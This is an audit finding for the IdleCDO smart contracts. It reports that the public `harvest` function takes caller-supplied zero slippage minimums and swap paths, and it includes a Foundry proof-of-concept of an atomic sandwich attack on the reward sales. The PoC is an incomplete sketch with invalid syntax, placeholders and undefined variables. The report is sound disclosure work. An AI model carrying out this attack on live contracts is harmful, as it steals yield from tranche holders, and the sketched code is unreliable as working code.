### Title
Permissionless `harvest` allows caller-controlled `amountOutMinimum = 0` and swap path, enabling atomic sandwiching of all reward sales - ([File: contracts/IdleCDO.sol](contracts/IdleCDO.sol))

### Summary
`IdleCDO._sellAllRewards` and `_sellReward` sell all strategy reward tokens through the Uniswap V3 router using `amountOutMinimum` and a `path` that are both fully supplied by the `harvest` caller via `_minAmount` and `_extraData`. Because `harvest` is a public, unprivileged entry point, any EOA can trigger the reward liquidation themselves, pass `amountOutMinimum = 0`, and atomically sandwich the swaps inside a single transaction, extracting value that belongs to tranche holders.

### Finding Description
The reward-liquidation pipeline is:

1. `harvest(_skipReward, _skipSell, _sellAmounts, _minAmount, _extraData)` (public) calls `strategy.redeemRewards(...)` / `_sellAllRewards`.
2. `_sellAllRewards` decodes per-reward swap paths directly from caller-supplied `_extraData` (`abi.decode(_extraData, (bytes[]))`) and passes each `_minAmount[i]` into `_sellReward` ([contracts/IdleCDO.sol:648-666](contracts/IdleCDO.sol#L648-L666)).
3. `_sellReward` builds `ISwapRouter.ExactInputParams` with `path: _path`, `amountIn: _amount`, and `amountOutMinimum: _minAmount` — with no internal floor, oracle check, or deviation bound ([contracts/IdleCDO.sol:619-630](contracts/IdleCDO.sol#L619-L630)). The same pattern is duplicated in `IdleCDOArbitrum`, `IdleCDOAvax`, `IdleCDOBase`, `IdleCDOOptimism`, `IdleCDOPolygon`, `IdleCDOPolygonZK` and `IdleLeveragedEulerStrategy._redeemRewards` ([contracts/strategies/euler/IdleLeveragedEulerStrategy.sol:165-173](contracts/strategies/euler/IdleLeveragedEulerStrategy.sol#L165-L173)).

The design intent is that a trusted keeper supplies honest min-amounts. However, nothing restricts who calls `harvest`, and the swap path itself is caller-controlled. An attacker therefore doesn't need to frontrun an honest harvest — they can call `harvest` themselves, inside a single transaction, with:

- `_minAmount = [0, 0, ...]` (disables all slippage protection), and
- a crafted `_path` routing the reward sale through a pool the attacker has just skewed.

Broken invariant: fair distribution of yield. Harvested rewards are the only mechanism that increases `priceAA`/`priceBB` via `_updateAccounting`; whatever is lost to slippage is permanently lost from `lastNAVAA`/`lastNAVBB` accrual. No existing guard (`_checkDefault`, `nonReentrant`, skim logic, KYC) applies — `harvest` intentionally performs external swaps in the same tx.

### Impact Explanation
All pending reward-token balances held by the CDO (which can be arbitrarily large if harvests are infrequent, e.g. accumulated CRV/CVX/EUL/AAVE) can be sold at near-zero output. The attacker profit equals `fairValue(rewards) − actualReceived − gas`, bounded only by pool liquidity they can manipulate. Loss is borne pro-rata by all AA and BB tranche holders as reduced tranche price appreciation — direct theft of protocol yield with quantified loss equal to the slippage extracted.

### Likelihood Explanation
Requires only: (a) unharvested reward tokens on the CDO/strategy, (b) a reward→underlying path whose pools the attacker can move (flash-loan capital suffices, since everything is atomic). No privileged role needed; the attacker calls `harvest` themselves. MEV bots monitoring reward balances can automate this continuously, and since `_minAmount` and path are calldata, there is zero cost to attempting it repeatedly whenever rewards accumulate.

### Recommendation
- Do not trust caller-supplied `amountOutMinimum`/`path` for swaps triggered by unprivileged callers. Either restrict `harvest` to a keeper/owner role, or compute `amountOutMinimum` on-chain (e.g. Uniswap V3 TWAP-based quote with a bounded `maxSlippage` bps) inside `_sellReward`, ignoring the caller's value when it is lower.
- Whitelist acceptable router paths or validate `path` endpoints (first token = reward, last token = `token`) instead of fully trusting `_extraData`.

### Proof of Concept
Foundry fork (mainnet, a live IdleCDO instance with accrued reward tokens):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;
import "forge-std/Test.sol";

contract HarvestSandwichTest is Test {
    IdleCDO cdo = IdleCDO(CDO_ADDRESS);
    ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IERC20 reward = IERC20(REWARD_TOKEN);  // e.g. a reward listed in strategy.getRewardTokens()
    IERC20 underlying = IERC20(cdo.token());
    address attacker = makeAddr("attacker");

    function testSandwichHarvest() public {
        // Assumption: CDO holds pending reward tokens (attacker can also
        // transfer dust rewards to the CDO to enlarge the sold balance).
        uint256 rewardBal = reward.balanceOf(address(cdo));
        vm.assume? // skip if 0
        require(rewardBal > 0, "no rewards");

        uint256 navBefore = cdo.lastNAVAA() + cdo.lastNAVBB();
        uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);

        vm.startPrank(attacker);
        AttackerContract atk = new AttackerContract(cdo, router, reward, underlying);
        reward.transfer(address(atk), rewardBal / 2); // or flash-loan
        atk.execute(); // swap reward -> underlying (push price down),
                       // call cdo.harvest(..., minAmount = 0, attacker path),
                       // swap underlying -> reward (buy back cheap)
        vm.stopPrank();

        assertGt(underlying.balanceOf(address(atk)) - attackerUnderlyingBefore, 0);
        // NAV grew by far less than fair value of rewards sold
    }
}

contract AttackerContract {
    constructor(IdleCDO cdo, ISwapRouter router, IERC20 reward, IERC20 underlying) { ... }

    function execute() external {
        // 1) sell reward for underlying, pushing pool price of reward down
        reward.approve(address(router), type(uint256).max);
        router.exactInputSingle(ExactInputSingleParams({
            tokenIn: reward, tokenOut: underlying, fee: 3000,
            recipient: address(this), deadline: block.timestamp,
            amountIn: rewardBal, amountOutMinimum: 0, sqrtPriceLimitX96: 0
        }));

        // 2) trigger harvest with zero slippage protection and chosen path
        uint256 n = cdo.strategy().getRewardTokens().length;
        bool[] memory skipReward = new bool[](n);
        bool[] memory skipSell   = new bool[](n);
        uint256[] memory sellAmts = new uint256[](n);  // 0 => sell full balance
        uint256[] memory minAmts  = new uint256[](n);  // all zeros
        bytes[] memory paths = new bytes[](n);
        paths[0] = abi.encodePacked(address(reward), uint24(3000), address(underlying));
        cdo.harvest(skipReward, skipSell, sellAmts, minAmts, abi.encode(paths));

        // 3) buy reward back at depressed price, keep the difference in underlying
        underlying.approve(address(router), type(uint256).max);
        router.exactOutputSingle(/* underlying -> reward */);
    }
}
```

All three legs execute atomically in one transaction, so no mempool frontrunning risk exists for the attacker; the only requirements are a public `harvest` and nonzero reward balance.